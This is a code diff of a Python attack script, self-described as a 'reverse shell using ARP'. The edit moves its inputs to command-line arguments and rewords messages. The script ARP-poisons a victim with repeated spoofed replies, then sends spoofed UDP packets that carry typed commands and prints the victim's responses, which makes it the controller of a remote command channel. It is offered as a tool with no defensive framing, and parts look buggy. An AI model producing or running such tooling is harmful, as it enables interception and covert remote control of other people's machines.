@@ -4,36 +4,32 @@ from socket import *
 import threading
 import time
 from logging import getLogger, ERROR
+import argparse
  
 # reverse shell using ARP
+from scapy.all import *
 
-getLogger('scapy.runtime').setLevel(ERROR)
- 
-try:
-    from scapy.all import *
-except ImportError:
-    print('[!] Scapy Installation Not Found')
-    sys.exit(1)
- 
-try:
-    victimIP = input('[*] Enter Victim IP: ')
-    spoofIP = input('[*] Enter IP to Spoof: ')
-    IF = input('[*] Enter Desired Interface: ')
-except KeyboardInterrupt:
-    print('[!] User Interrupted Input')
-    sys.exit(1)
+parser = argparse.ArgumentParser()
+parser.add_argument("--ip", "-ip", type=str, required=True)
+parser.add_argument("--spoof", "-s", type=str, required=True)
+parser.add_argument("--interface", "-i", type=str, required=True)
+args = parser.parse_args()
+
+vic_ip = args.ip
+spoof = args.spoof
+interface = args.interface
  
 conf.verb = 0
  
 def getMAC():
     try:
-        pkt = srp(socket.Ether(dst = "ff:ff:ff:ff:ff:ff")/socket.ARP(pdst = victimIP), timeout = 2, iface = IF, inter = 0.1)
+        pkt = srp(socket.Ether(dst = "ff:ff:ff:ff:ff:ff")/socket.ARP(pdst = vic_ip), timeout = 2, iface = interface, inter = 0.1)
     except Exception:
-        print('[!] Failed to Resolve Victim MAC Address')
+        print('error: failed to get mac address')
         sys.exit(1)
     for snd, rcv in pkt[0]:
         return rcv.sprintf(r"%Ether.src%")
-print('\n[*] Resolving Victim MAC Address... ')
+print('\n got victim mac address ')
 victimMAC = getMAC()
  
  
@@ -43,35 +39,34 @@ def poison():
         if spoofStatus == False:
             break
             return
-        send(socket.ARP(op=2, pdst=victimIP, psrc=spoofIP, hwdst=victimMAC))
+        send(socket.ARP(op=2, pdst=vic_ip, psrc=spoof, hwdst=victimMAC))
         time.sleep(5)
  
-print('\n[*] Starting Spoofer Thread...')
+print('\n starting thread for poisoning')
 thread = []
 try:
     poisonerThread = threading.Thread(target=poison)
     thread.append(poisonerThread)
     poisonerThread.start()
-    print('[*] Thread Started Successfully\n')
+    print('started!\n')
 except Exception:
-    print('[!] Failed to Start Thread')
+    print('failed to start')
     sys.exit(1)
  
-print('[*] Initializing Interaction With Victim...')
-pkt1 = sr1(socket.IP(dst=victimIP, src=spoofIP)/socket.UDP(sport=80, dport=80)/Raw(load='hello victim'))
-pkt2 = sr1(socket.IP(dst=victimIP, src=spoofIP)/socket.UDP(sport=80, dport=80)/Raw(load='report'))
+print('starting connection with victim')
+pkt1 = sr1(socket.IP(dst=vic_ip, src=spoof)/socket.UDP(sport=80, dport=80)/Raw(load='hello victim'))
+pkt2 = sr1(socket.IP(dst=vic_ip, src=spoof)/socket.UDP(sport=80, dport=80)/Raw(load='report'))
  
 prompt = pkt2.getlayer(Raw).load
  
-print('[*] Initialization Complete')
-print('[*] Enter "goodbye" to Stop Interaction\n')
+print('connected with victim\n')
+print('enter goodbye to exit\n')
  
 while 1:
     command = input(prompt)
-    sendcom = sr1(socket.IP(dst=victimIP, src=spoofIP)/socket.UDP(sport=80, dport=80)/Raw(load=command))
+    sendcom = sr1(socket.IP(dst=vic_ip, src=spoof)/socket.UDP(sport=80, dport=80)/Raw(load=command))
     output = sendcom.getlayer(Raw).load
     if command.strip() == 'goodbye':
-        print('\nGrabbing Threads...')
         spoofStatus = False
         poisonerThread.join()
         sys.exit(1)
